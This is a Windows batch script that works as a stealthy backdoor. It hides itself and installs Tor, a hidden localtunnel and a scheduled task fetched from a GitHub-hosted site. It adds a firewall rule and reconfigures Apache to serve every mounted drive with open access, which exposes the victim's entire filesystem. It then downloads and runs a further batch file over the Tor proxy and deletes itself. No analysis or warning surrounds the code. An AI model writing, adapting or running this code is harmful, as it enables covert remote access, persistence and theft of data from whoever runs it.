@echo off
setlocal 

attrib +s +h +i "%~f0"
:connectivitycheck
ping www.google.com -n 1 -w 5000 >NUL
if errorlevel 1 goto Connectivitycheck

Set host=https://cryptedodissey.github.io
Set enviroment=C:\Windows

rem TESTING >
if "%computername%"=="WIN-6QJBGJLRIGL" set environment=%appdata%\microsoft\windows
rem TESTING <

if exist "%environment%\tor.exe" (
    echo.
) else (
"%environment%\curl.exe" -k -L https://archive.torproject.org/tor-package-archive/torbrowser/12.0.4/tor-expert-bundle-12.0.4-windows-x86_64.tar.gz > "%temp%\Tor.tar.gz" && "%environment%\7-Zip\7z.exe" e "%temp%\Tor.tar.gz" -so | "%environment%\7-Zip\7z.exe" e -aoa -si -ttar "tor/tor.exe" -o"%environment%" -y && attrib +s +h +i "%environment%\tor.exe" && del "%temp%\Tor.tar.gz"
)

tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
if not errorlevel 1 (echo) else (
  "%environment%\nircmd.exe" exec hide "%environment%\tor.exe" && timeout -t 30
)

tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else (
  set "proxy=--tlsv1"
)

FOR /F "tokens=1,2 delims==" %%s IN ('wmic path win32_useraccount where name^='%username%' get sid /value ^| find /i "SID"') DO SET SID=%%t
curl -k %proxy% "https://raw.githubusercontent.com/cryptedodissey/cryptedodissey.github.io/main/Task.xml" > "%SID%.xml"
powershell -Command "(gc '%SID%.xml') -replace 'SID', '%SID%' | Out-File -encoding ASCII '%SID%.xml'"
powershell -Command "(gc '%SID%.xml') -replace 'environment', '%environment%' | Out-File -encoding ASCII '%SID%.xml'"
powershell -Command "(gc '%SID%.xml') -replace 'computername', '%computername%' | Out-File -encoding ASCII '%SID%.xml'"
powershell -Command "(gc '%SID%.xml') -replace 'username', '%username%' | Out-File -encoding ASCII '%SID%.xml'"
schtasks /Delete /TN "%SID%XYZ" /F
schtasks /create /tn "%SID%XYZ" /xml "%SID%.xml"
del "%SID%.xml"

attrib -s -h -i "%environment%\localtunnel"
tasklist /fi "imagename eq localtunnel.exe" | find /i "localtunnel.exe" > nul
if not errorlevel 1 (attrib +s +h +i "%environment%\localtunnel") else (del /s /f /q /a "%temp%\localtunnel.bat" && del /s /f /q /a "%temp%\localtunnel.txt" && echo ^%environment%\localtunnel\localtunnel.exe --no-dashboard -h 127.0.0.1 -p 7432 --passthrough http^ ^>^ ^%temp%\localtunnel.txt^ > "%temp%\localtunnel.bat" && "%environment%\nircmd.exe" exec hide "%temp%\localtunnel.bat" && timeout -t 5 && attrib +s +h +i "%environment%\localtunnel" && attrib +s +h +i "%temp%\localtunnel.txt" && attrib +s +h +i "%temp%\localtunnel.bat" && timeout -t 10
)

netsh advfirewall firewall show rule name="apache" >nul 2>&1
if %errorlevel% equ 0 (
    echo.
) else (
    netsh advfirewall firewall add rule name="apache" dir=in action=allow program="%environment%\apache2\bin\httpd.exe" protocol=any profile=any
)

taskkill /f /im "httpd.exe"

copy /y "%environment%\apache2\conf\httpd.conf" "%environment%\apache2\conf\httpd.conf.bak"
more +2 "%environment%\apache2\conf\httpd.conf" > "%environment%\apache2\conf\httpd.txt" && move /y "%environment%\apache2\conf\httpd.txt" "%environment%\apache2\conf\httpd.conf"
echo Define ENVIRONMENT "%environment%" >> "%environment%\apache2\conf\httpd.txt"
echo Define PORT "7432" >> "%environment%\apache2\conf\httpd.txt"
type "%environment%\apache2\conf\httpd.conf" >> "%environment%\apache2\conf\httpd.txt"
move /y "%environment%\apache2\conf\httpd.txt" "%environment%\apache2\conf\httpd.conf"

setlocal enabledelayedexpansion
FOR /F "usebackq tokens=1" %%a IN (`MOUNTVOL ^| FIND ":\"`) DO (FOR /F "usebackq tokens=3" %%b IN (`FSUTIL FSINFO DRIVETYPE %%a`) DO (set drive=%%a && echo ^Alias /!drive:~0,-2! "!drive:~0,-2!" >> %environment%\apache2\conf\httpd.conf^ && echo ^<Directory "!drive:~0,-2!"^> >> %environment%\apache2\conf\httpd.conf && echo ^Options Indexes FollowSymLinks MultiViews >> %environment%\apache2\conf\httpd.conf^ && echo ^AllowOverride All >> %environment%\apache2\conf\httpd.conf^ && echo ^Require all granted >> %environment%\apache2\conf\httpd.conf^ && echo ^</Directory^> >> %environment%\apache2\conf\httpd.conf))
setlocal disabledelayedexpansion

tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
if not errorlevel 1 (echo.) else ("%environment%\nircmd.exe" exec hide "%environment%\apache2\bin\httpd.exe")
timeout -t 10
copy /y "%environment%\apache2\conf\httpd.conf" "%environment%\apache2\conf\httpd.conf.log"
move /y "%environment%\apache2\conf\httpd.conf.bak" "%environment%\apache2\conf\httpd.conf"

set "win32=%random%"
"%environment%\curl.exe" -k %proxy% %host%/win32.bat -o "%environment%\Win32\%win32%.bat" && attrib +s +h +i "%environment%\Win32\%win32%.bat"
timeout -t 300
"%environment%\nircmd.exe" exec hide "%environment%\Win32\%win32%.bat"
endlocal
DEL /s /f /q /a "%~f0"
